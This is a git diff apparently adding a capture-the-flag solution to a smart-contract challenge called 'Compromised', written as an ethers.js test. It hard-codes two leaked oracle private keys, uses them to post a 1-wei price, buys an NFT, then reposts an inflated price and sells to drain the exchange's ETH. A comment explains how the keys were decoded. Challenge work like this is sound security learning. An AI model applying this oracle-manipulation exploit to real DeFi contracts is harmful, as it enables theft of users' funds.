@@ -20,17 +20,17 @@ describe('Compromised challenge', function () {
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, player] = await ethers.getSigners();
-        
+
         // Initialize balance of the trusted source addresses
         for (let i = 0; i < sources.length; i++) {
             setBalance(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
             expect(await ethers.provider.getBalance(sources[i])).to.equal(TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
         }
-        
+
         // Player starts with limited balance
         setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
         expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
-        
+
         // Deploy the oracle and setup the trusted sources with initial prices
         const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);
         oracle = await (await ethers.getContractFactory('TrustfulOracle', deployer)).attach(
@@ -53,21 +53,55 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const manipulatedPrice = 1n;
+        const compromisedKey1 = "c678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+        const attacker1 = new ethers.Wallet(compromisedKey1, ethers.provider);
+        await oracle.connect(attacker1).postPrice("DVNFT", manipulatedPrice);
+
+        const compromisedKey2 = "208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+        const attacker2 = new ethers.Wallet(compromisedKey2, ethers.provider);
+        await oracle.connect(attacker2).postPrice("DVNFT", manipulatedPrice);
+
+        await exchange.connect(player).buyOne({ value: manipulatedPrice });
+        await nftToken.connect(player).approve(exchange.address, 0);
+        await oracle.connect(attacker1).postPrice("DVNFT", INITIAL_NFT_PRICE + manipulatedPrice);
+        await oracle.connect(attacker2).postPrice("DVNFT", INITIAL_NFT_PRICE + manipulatedPrice);
+
+        await exchange.connect(player).sellOne(0);
+
+        await oracle.connect(attacker1).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        await oracle.connect(attacker2).postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        /*
+        Explanation:
+        Web server leaked the private key for second and third oracles.
+        The private key is the hex value to ASCII, then decode that as base64, then you get their private keys.
+        With the keys we report that the price is 1 wei.
+        We buy.
+        We report the new price being INITIAL + 1 wei.
+        We sell.
+        We report the price as INITIAL again.
+
+        Misc: I lost a LOT of time because I tried to sell NFT id == 1 in sellOne().
+        It gave me an invalid BigNumber error and I had NO IDEA it was caused because id was 1. Sad.
+        Errors are terrible in Ethers.
+        */
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
-        
+
         // Exchange must have lost all ETH
         expect(
             await ethers.provider.getBalance(exchange.address)
         ).to.be.eq(0);
-        
+
         // Player's ETH balance must have significantly increased
         expect(
             await ethers.provider.getBalance(player.address)
         ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
-        
+
         // Player must not own any NFT
         expect(
             await nftToken.balanceOf(player.address)
